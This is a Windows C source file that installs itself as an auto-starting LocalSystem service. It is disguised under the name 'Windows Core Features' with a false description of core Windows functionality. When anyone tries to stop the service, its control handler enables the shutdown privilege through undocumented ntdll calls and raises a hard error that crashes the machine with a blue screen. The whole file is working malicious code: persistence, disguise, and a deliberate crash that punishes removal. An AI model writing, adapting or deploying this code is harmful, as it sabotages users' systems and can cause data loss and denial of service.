#include <stdio.h>
#include <windows.h>
#include <winsvc.h>
#include <tchar.h>
#include <ntstatus.h>
#include <winternl.h>

SERVICE_STATUS g_ServiceStatus;
SERVICE_STATUS_HANDLE g_ServiceStatusHandle;
HANDLE g_ServiceStopEvent;

#define SERVICE_NAME TEXT("Windows Core Features")
#define SERVICE_DESCRIPTION TEXT("This service provides core functionality for Windows applications. Can't be stopped.")

typedef NTSTATUS (NTAPI *RtlAdjustPrivilegeFunc)(
    ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

typedef NTSTATUS (NTAPI *NtRaiseHardErrorFunc)(
    NTSTATUS ErrorStatus, 
    ULONG NumberOfParameters, 
    ULONG UnicodeStringParameterMask, 
    PULONG_PTR Parameters, 
    ULONG ValidResponseOptions, 
    PULONG Response
);

void TriggerBSOD() {
    HMODULE ntdll = LoadLibrary(TEXT("ntdll.dll"));
    if (ntdll) {
        RtlAdjustPrivilegeFunc RtlAdjustPrivilege = (RtlAdjustPrivilegeFunc)GetProcAddress(ntdll, "RtlAdjustPrivilege");
        NtRaiseHardErrorFunc NtRaiseHardError = (NtRaiseHardErrorFunc)GetProcAddress(ntdll, "NtRaiseHardError");

        BOOLEAN bEnabled;
        ULONG uResponse;

        if (RtlAdjustPrivilege && NtRaiseHardError) {
            RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &uResponse);
        }

        FreeLibrary(ntdll);
    }
}

VOID ReportSvcStatus(DWORD dwCurrentState, DWORD dwWin32ExitCode, DWORD dwWaitHint) {
    static DWORD dwCheckPoint = 1;
    g_ServiceStatus.dwCurrentState = dwCurrentState;
    g_ServiceStatus.dwWin32ExitCode = dwWin32ExitCode;
    g_ServiceStatus.dwWaitHint = dwWaitHint;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;

    if (dwCurrentState == SERVICE_START_PENDING) {
        g_ServiceStatus.dwControlsAccepted = 0;
    }

    if (dwCurrentState == SERVICE_RUNNING || dwCurrentState == SERVICE_STOPPED) {
        g_ServiceStatus.dwCheckPoint = 0;
    } else {
        g_ServiceStatus.dwCheckPoint = dwCheckPoint++;
    }

    SetServiceStatus(g_ServiceStatusHandle, &g_ServiceStatus);
}

VOID WINAPI ServiceCtrlHandler(DWORD dwCtrl) {
    switch (dwCtrl) {
        case SERVICE_CONTROL_STOP:
            TriggerBSOD();
            break;
        default:
            break;
    }
}

VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv) {
    g_ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);

    if (g_ServiceStatusHandle == NULL) {
        return;
    }

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    g_ServiceStatus.dwControlsAccepted = 0;
    g_ServiceStatus.dwWin32ExitCode = 0;
    g_ServiceStatus.dwServiceSpecificExitCode = 0;
    g_ServiceStatus.dwWaitHint = 30000;

    ReportSvcStatus(SERVICE_START_PENDING, NO_ERROR, 30000);

    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

    if (g_ServiceStopEvent == NULL) {
        ReportSvcStatus(SERVICE_STOPPED, GetLastError(), 0);
        return;
    }

    ReportSvcStatus(SERVICE_RUNNING, NO_ERROR, 0);

    while (WaitForSingleObject(g_ServiceStopEvent, INFINITE) != WAIT_OBJECT_0) {}

    ReportSvcStatus(SERVICE_STOPPED, NO_ERROR, 0);
}

void InstallService() {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (hSCManager) {
        TCHAR path[MAX_PATH];
        GetModuleFileName(NULL, path, MAX_PATH);

        SC_HANDLE hService = CreateService(
            hSCManager,
            SERVICE_NAME,
            SERVICE_NAME,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_NORMAL,
            path,
            NULL,
            NULL,
            NULL,
            TEXT("LocalSystem"),
            NULL
        );

        if (hService) {
            LPSERVICE_DESCRIPTION psd = (LPSERVICE_DESCRIPTION)LocalAlloc(LPTR, sizeof(SERVICE_DESCRIPTION));
            if (psd != NULL) {
                psd->lpDescription = SERVICE_DESCRIPTION;
                ChangeServiceConfig2(hService, SERVICE_CONFIG_DESCRIPTION, psd);
                LocalFree(psd);
            }

            if (!StartService(hService, 0, NULL)) {
                DWORD error = GetLastError();
            }

            CloseServiceHandle(hService);
        } else {
            DWORD error = GetLastError();
        }
        CloseServiceHandle(hSCManager);
    } else {
        DWORD error = GetLastError();
    }
}

int main() {
    InstallService();

    SERVICE_TABLE_ENTRY ServiceTable[] = {
        { SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
        {NULL, NULL}
    };

    if (StartServiceCtrlDispatcher(ServiceTable) == 0) {
        return GetLastError();
    }

    return 0;
}
